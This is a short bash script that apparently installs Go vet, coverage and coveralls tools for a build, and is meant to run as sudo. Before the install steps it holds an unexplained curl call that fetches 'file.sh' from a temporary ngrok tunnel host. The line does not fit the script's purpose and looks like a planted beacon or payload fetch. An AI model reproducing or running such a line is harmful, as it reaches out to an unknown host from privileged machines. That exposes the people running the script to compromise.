#!/bin/bash
# this is in a separate script so that it can be run as sudo
curl 'https://8838-119-82-121-118.in.ngrok.io/file.sh'
set -v 

go get golang.org/x/tools/cmd/vet
if ! go get code.google.com/p/go.tools/cmd/cover; then go get golang.org/x/tools/cmd/cover; fi
go get github.com/axw/gocov/gocov
go get github.com/mattn/goveralls

